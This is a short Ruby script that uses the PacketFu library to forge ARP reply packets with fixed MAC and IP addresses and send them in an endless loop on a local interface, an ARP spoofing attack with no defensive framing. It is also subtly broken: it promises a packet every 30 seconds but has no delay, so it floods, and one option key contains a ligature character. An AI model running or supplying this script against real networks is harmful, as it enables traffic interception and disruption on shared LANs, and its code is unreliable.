#!/usr/bin/env ruby
# encoding: UTF-8
# need pcaprub install
# broadcast mac address FF:FF:FF:FF:FF:FF

require 'packetfu'

$config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> "en0")).config

puts "Sending ARP Packet Spoof Every 30 Seconds…"
x = PacketFu::ARPPacket.new(:config => $config, :ﬂavor => "Windows")
  x.eth_saddr = "04:46:65:5c:d9:7d"
  x.eth_daddr = "c8:3a:35:46:1f:40"
  x.arp_saddr_mac = "04:46:65:5c:d9:7d"
  x.arp_daddr_mac = "c8:3a:35:46:1f:40"
  x.arp_saddr_ip = '127.0.0.1'
  x.arp_daddr_ip = '192.168.0.101'
  x.arp_opcode=2
  sunny=false
  while sunny==false do
  x.to_w('en0')
end
